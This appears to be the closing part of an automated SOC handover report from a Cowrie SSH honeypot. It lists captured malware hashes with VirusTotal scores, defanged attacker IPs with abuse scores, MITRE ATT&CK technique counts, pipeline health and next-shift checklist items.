| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `156.227.232[.]96` | JP | Yisu Cloud Ltd | **100** ⚠️ | 4 |
| `171.214.220[.]133` | CN | CHINANET Sichuan province network | **100** ⚠️ | 0 |
| `15.204.58[.]181` | US | OVH US LLC | **100** ⚠️ | 10 |
| `118.196.34[.]237` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 1 |
| `87.106.46[.]37` | DE | IONOS SE | **100** ⚠️ | 4 |
| `120.48.28[.]60` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 32 |
| `94.143.141[.]37` | ES | IONOS SE | **100** ⚠️ | 8 |
| `101.36.127[.]212` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 44 |
| `14.103.111[.]167` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `220.249.186[.]9` | CN | FJFZ-JiaYunWangWeiTech-Corp | **100** ⚠️ | 29 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 298 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 148 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 118 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 61 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 60 |

---

## 🔕 False Positive Summary (1 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 301 cases |
| Tool 34  | Credential Extractor        | ✅ 266 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 20 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 1 filtered (0.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 13 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 118 priority case(s) shown individually · 18 recon entry/entries in table (12 group(s) consolidating 176 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-13T17:02:17Z_
